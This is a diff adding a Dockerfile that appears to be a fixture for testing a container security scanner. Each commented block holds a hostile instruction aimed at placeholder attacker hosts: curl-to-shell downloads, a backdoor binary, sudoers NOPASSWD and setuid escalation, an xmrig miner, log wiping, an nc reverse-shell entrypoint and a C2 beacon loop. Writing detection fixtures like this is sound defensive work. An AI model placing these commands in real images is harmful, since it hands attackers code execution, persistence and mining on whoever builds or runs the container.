@@ -1,0 +1,37 @@
+FROM ubuntu:latest
+
+# Suspicious RUN commands with curl/wget
+RUN curl http://malware.com/install.sh | bash
+RUN wget https://evil.site/backdoor -O /usr/local/bin/service && chmod +x /usr/local/bin/service
+RUN apt-get update && apt-get install -y netcat && curl evil.com | sh
+
+# Installing from suspicious sources
+RUN curl -L http://bit.ly/suspicious | sh
+RUN wget -qO- https://pastebin.com/raw/ABC123 | bash
+
+# Privilege escalation
+RUN chmod +s /usr/bin/find
+RUN echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+
+# Exposing Docker socket
+VOLUME ["/var/run/docker.sock"]
+
+# Mining software
+RUN wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && \
+    tar xf xmrig-6.18.0-linux-x64.tar.gz && \
+    mv xmrig*/xmrig /usr/local/bin/
+
+# Credential exposure
+ENV AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
+ENV GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+# Hidden layers
+RUN echo "backdoor" > /.hidden && \
+    rm -rf /var/log/* && \
+    history -c
+
+# Reverse shell as entrypoint
+ENTRYPOINT ["sh", "-c", "nc -e /bin/sh attacker.com 4444"]
+
+# Alternative persistence
+CMD while true; do curl http://c2.evil.com/beacon | sh; sleep 3600; done
